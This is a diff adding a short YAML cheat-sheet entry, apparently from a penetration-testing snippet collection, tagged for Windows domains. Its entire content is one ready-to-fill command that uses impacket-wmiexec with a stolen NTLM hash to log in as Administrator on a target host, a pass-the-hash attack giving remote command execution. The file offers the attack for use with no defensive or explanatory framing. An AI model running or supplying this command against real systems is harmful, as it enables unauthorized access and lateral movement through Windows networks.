@@ -1,0 +1,8 @@
+metadata:
+  filename: "impacket-wmiexec-pass-the-hash.yaml"
+  tags: ["windows", "domain"]
+  created: "2025-03-29"
+  author: "Unknown"
+
+content: |
+  impacket-wmiexec -hashes 00000000000000000000000000000000:<NTLM-hash> Administrator@<IP>
